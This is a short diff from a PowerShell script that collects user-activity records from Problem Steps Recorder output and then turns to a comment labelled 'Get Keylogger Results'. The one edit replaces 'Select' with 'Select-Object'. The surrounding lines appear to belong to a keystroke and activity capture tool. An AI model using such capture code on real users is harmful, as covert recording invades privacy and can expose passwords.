@@ -129,7 +129,7 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
         Start-Sleep -Milliseconds 250
         $PSRFile = (Get-ChildItem $dir\*.mht | Sort-Object LastWriteTime | Select-Object -last 1)
         $regex = '.*[AP]M\)' #'^Step \d+: \(\u200E\d{1,2}/\u200E\d{1,2}/\u200E\d{4} \d{1,2}:\d{2}:\d{2} (AM|PM)\) '
-        ((Get-Content $PSRFile | select-string "^        <p><b>") -replace '^        <p><b>', '' -replace '</b>', '' -replace '</p>', '' -replace '&quot;', "'") -replace $regex | Select-String '^ User' | Select -ExpandProperty Line | Out-File "$dir\steps.txt" 
+        ((Get-Content $PSRFile | select-string "^        <p><b>") -replace '^        <p><b>', '' -replace '</b>', '' -replace '</p>', '' -replace '&quot;', "'") -replace $regex | Select-String '^ User' | Select-Object -ExpandProperty Line | Out-File "$dir\steps.txt" 
         $PSRResult = Get-Content "$dir\steps.txt"
 
         # Get Keylogger Results
